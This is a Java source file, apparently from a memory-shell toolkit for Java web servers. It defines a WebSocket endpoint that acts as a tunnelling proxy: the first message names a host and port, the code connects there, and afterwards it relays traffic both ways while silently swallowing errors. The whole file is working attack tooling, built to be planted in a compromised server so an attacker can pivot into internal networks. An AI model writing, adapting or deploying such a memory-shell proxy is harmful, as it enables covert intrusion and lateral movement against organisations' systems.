package com.reajason.javaweb.memshell.shelltool.wsproxy;

import javax.websocket.Endpoint;
import javax.websocket.EndpointConfig;
import javax.websocket.MessageHandler;
import javax.websocket.Session;
import java.io.ByteArrayOutputStream;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.AsynchronousSocketChannel;
import java.nio.channels.CompletionHandler;
import java.util.HashMap;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

/**
 * @author ReaJason
 * @since 2026/1/14
 */
public class ProxyWebSocket extends Endpoint implements MessageHandler.Whole<ByteBuffer>, CompletionHandler<Integer, Session> {
    private Session session;
    private long messageCount = 0;
    private AsynchronousSocketChannel currentClient = null;
    private final ByteBuffer buffer = ByteBuffer.allocate(102400);
    private ByteArrayOutputStream baos = new ByteArrayOutputStream();
    private final HashMap<String, AsynchronousSocketChannel> channelMap = new HashMap<>();

    public ProxyWebSocket() {
    }

    public void completed(Integer result, Session attachment) {
        buffer.clear();
        try {
            if (buffer.hasRemaining() && result >= 0) {
                byte[] arr = new byte[result];
                buffer.get(arr, 0, result);
                baos.write(arr, 0, result);
                ByteBuffer response = ByteBuffer.wrap(baos.toByteArray());
                if (attachment.isOpen()) {
                    attachment.getBasicRemote().sendBinary(response);
                }
                baos = new ByteArrayOutputStream();
                readFromServer(attachment, currentClient);
            } else {
                if (result > 0) {
                    byte[] arr = new byte[result];
                    buffer.get(arr, 0, result);
                    baos.write(arr, 0, result);
                    readFromServer(attachment, currentClient);
                }
            }
        } catch (Exception ignored) {
        }
    }

    @Override
    public void failed(Throwable exc, Session attachment) {
        exc.printStackTrace();
    }

    public void onMessage(ByteBuffer message) {
        try {
            message.clear();
            messageCount++;
            process(message, session);
        } catch (Exception ignored) {
        }
    }

    public void onOpen(Session session, EndpointConfig endpointConfig) {
        this.messageCount = 0;
        this.session = session;
        session.setMaxBinaryMessageBufferSize(1024 * 1024 * 1024);
        session.setMaxTextMessageBufferSize(1024 * 1024 * 1024);
        session.addMessageHandler(this);
    }

    private void readFromServer(Session channel, AsynchronousSocketChannel client) {
        this.currentClient = client;
        buffer.clear();
        client.read(buffer, channel, this);
    }

    private void process(ByteBuffer messageBuffer, Session channel) {
        try {
            if (messageCount > 1) {
                AsynchronousSocketChannel client = channelMap.get(channel.getId());
                client.write(messageBuffer).get();
                readFromServer(channel, client);
            } else if (messageCount == 1) {
                String values = new String(messageBuffer.array());
                String[] array = values.split(" ");
                String[] addrArray = array[1].split(":");
                AsynchronousSocketChannel client = AsynchronousSocketChannel.open();
                int port = Integer.parseInt(addrArray[1]);
                InetSocketAddress hostAddress = new InetSocketAddress(addrArray[0], port);
                Future<Void> future = client.connect(hostAddress);
                try {
                    future.get(10, TimeUnit.SECONDS);
                } catch (Exception ignored) {
                    channel.getBasicRemote().sendText("HTTP/1.1 503 Service Unavailable\r\n\r\n");
                    return;
                }
                channelMap.put(channel.getId(), client);
                readFromServer(channel, client);
                channel.getBasicRemote().sendText("HTTP/1.1 200 Connection Established\r\n\r\n");
            }
        } catch (Exception ignored) {
        }
    }
}
